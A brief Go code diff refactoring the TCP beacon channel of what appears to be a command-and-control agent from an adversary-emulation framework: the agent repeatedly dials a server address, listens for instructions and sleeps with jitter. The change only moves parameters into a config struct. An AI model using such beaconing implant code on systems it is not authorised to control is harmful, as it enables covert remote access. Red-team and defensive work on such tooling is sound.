@@ -19,15 +19,15 @@ func init() {
 	CommunicationChannels["tcp"] = TCP{}
 }
 
-func (contact TCP) Communicate(address string, sleep int, beacon Beacon) {
+func (contact TCP) Communicate(agent util.AgentConfig, beacon Beacon) {
 	for {
-		conn, err := net.Dial("tcp", address)
+		conn, err := net.Dial("tcp", agent.Address)
 	   	if err != nil {
-	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
+	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
 	   		listen(conn, beacon)
 	   	}
-	   	jitterSleep(sleep, "TCP")
+	   	jitterSleep(agent.Sleep, "TCP")
 	}
 }
 
